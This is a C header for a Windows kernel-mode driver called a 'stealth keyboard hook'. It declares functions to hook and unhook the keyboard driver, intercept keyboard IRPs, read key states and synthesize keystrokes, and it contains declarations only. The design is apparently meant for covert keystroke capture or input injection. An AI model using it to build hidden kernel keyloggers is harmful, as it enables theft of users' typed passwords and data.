#ifndef _STEALTH_KEYBOARD_HOOK_H_
#define _STEALTH_KEYBOARD_HOOK_H_

// Include Files
#include <NTddk.h> 
#include <Ntddkbd.h>
#include <Kbdmou.h>
//#include "ioctl.h" 

typedef NTSTATUS(__fastcall *kbdinput)(void *a1, void *a2, void *a3, void *a4, void *a5);
typedef void(__fastcall *KeyboardServiceDpc)(PDEVICE_OBJECT kbd, PKEYBOARD_INPUT_DATA a1, PKEYBOARD_INPUT_DATA a2, PULONG a3);

typedef NTSTATUS(__fastcall *KeyboardAddDevice)(PDRIVER_OBJECT a1, PDEVICE_OBJECT a2);


// Create Keyboard Hook Create.
NTSTATUS Keyboard_Create(IN PDRIVER_OBJECT driverObject);
NTSTATUS Keyboard_Close(IN PDRIVER_OBJECT driverObject);
NTSTATUS Keyboard_Hook(IN PDRIVER_OBJECT driverObject);
NTSTATUS Keyboard_UnHook(IN PDRIVER_OBJECT driverObject);



NTSTATUS Keyboard_HookProc(	IN PDEVICE_OBJECT DeviceObject,	IN PIRP Irp	);
NTSTATUS Keyboard_IO_InternalIoctl(PDEVICE_OBJECT device, PIRP irp);

int GetKeyState(char scan);
void SynthesizeKeyboard(PKEYBOARD_INPUT_DATA a1);

#endif